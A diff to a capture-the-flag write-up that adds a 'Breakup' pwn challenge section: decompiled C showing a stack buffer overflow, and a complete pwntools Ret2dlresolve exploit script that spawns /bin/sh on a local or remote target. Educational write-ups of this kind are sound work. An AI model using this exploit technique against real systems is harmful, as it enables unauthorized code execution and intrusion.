@@ -7,9 +7,9 @@
 ## Pwn
 -  Puts in boot
 -  Karma
+-  Breakup
 -  Dubdubdub
 -  Shellstorm
--  Breakup
 
 ## Cryptography
 - Row row row your boat
@@ -393,7 +393,7 @@ Here's how my exploit will go:
 - Leak got of write
 - Rop to system
 
-Here's my exploit script
+Here's my exploit [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bicdefcon_23/karma/exploit.py)
 
 ```python
 #!/usr/bin/python3
@@ -506,13 +506,126 @@ Replace: libc = elf.libc
 To: libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')
 ```
 
+### Breakup [First Blood 🩸]
+
+After downloading the attached file and checking the file type and mitgation enabled I got this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7002fe7f-792c-4dae-824f-02555a3d7528)
+
+The same as the previous ones
+
+I'll run it to know what it does
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a0a84113-7179-4400-b4ec-2e3f494f5c9a)
+
+It prints out some words receives our input then exits
+
+Using ghidra I decompiled the binary
+
+Here's the main function
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c16543f5-159c-452e-96d0-72413d5bda47)
+```c
+
+undefined8 main(void)
+
+{
+  undefined8 breakup;
+  undefined8 local_f0;
+  undefined8 local_e8;
+  undefined8 local_e0;
+  undefined8 local_d8;
+  undefined8 local_d0;
+  undefined8 local_c8;
+  undefined8 local_c0;
+  undefined8 local_b8;
+  undefined8 local_b0;
+  undefined8 local_a8;
+  undefined8 local_a0;
+  undefined8 local_98;
+  undefined8 local_90;
+  undefined8 local_88;
+  undefined8 local_80;
+  undefined8 local_78;
+  undefined8 local_70;
+  undefined2 local_68;
+  undefined buffer [72];
+  FILE *ptr;
+  
+  ptr = stdout;
+  breakup = 0x6b6f726220656853;
+  local_f0 = 0x7469772070752065;
+  local_e8 = 0x20283a20656d2068;
+  local_e0 = 0x65726568206d2749;
+  local_d8 = 0x6e696b6e69726420;
+  local_d0 = 0x6173206568742067;
+  local_c8 = 0x656c207473656464;
+  local_c0 = 0x6b616873206e6f6d;
+  local_b8 = 0x6874206e6f207365;
+  local_b0 = 0x74656e616c702065;
+  local_a8 = 0x796c646e694b202e;
+  local_a0 = 0x6574696e75657220;
+  local_98 = 0x6b63616220656d20;
+  local_90 = 0x7247206874697720;
+  local_88 = 0x76696c4f20656361;
+  local_80 = 0x706d6f6854206169;
+  local_78 = 0x6d2069202c6e6f73;
+  local_70 = 0x2e72656820737369;
+  local_68 = 10;
+  fputs((char *)&breakup,stdout);
+  read(0,buffer,0x100);
+  return 0;
+}
+```
+
+It uses `fputs` to print out those words then uses `read` to read 0x100 bytes into a buffer that can only hold up 72 bytes
+
+So we have our buffer overflow
+
+I got the offset using the same way I did previously and it was `88`
+
+Now how do we exploit this?
+
+Well I was first trying if I could leak got using `fputs` and that failed reason if because in the exploit I was trying to refer `stdout` as `0x1` but that's wrong because `stdout` is a function in libc and can't just be replaced using a number set in a register
+
+So what else can we do here 🤔
+
+Looking at [this](https://ir0nstone.gitbook.io/notes/) I found a ROP technique called Ret2DlResolve
+
+And that's what I used to exploit this binary
+
+Here's my exploit [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bicdefcon_23/breakup/exploit.py)
+
+```python
+from pwn import *
+
+context.binary = 'breakup'
+
+# Make Ret2DLResolve Payload
+rop = ROP(context.binary)
+dlresolve = Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh\x00'])
+rop.read(0, dlresolve.data_addr)
+rop.raw(rop.ret[0])
+rop.ret2dlresolve(dlresolve)
+raw_rop = rop.chain()
+pprint(rop.dump())
+
+if len(sys.argv) == 1:
+    io = context.binary.process()
+else:
+    host, port = sys.argv[1].split(':')
+    io = remote(host, port)
+
+try:
+    io.sendline(b'A' * 88 + raw_rop)
+    io.sendline(dlresolve.payload)
+    io.interactive()
+except EOFError:
+    pass
+```
+
+Running it works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e5360436-b004-4143-a982-c139b7af5532)
 
 
-
-
-
-
-
+### Dubdubdub [First Blood 🩸]
 
 
 
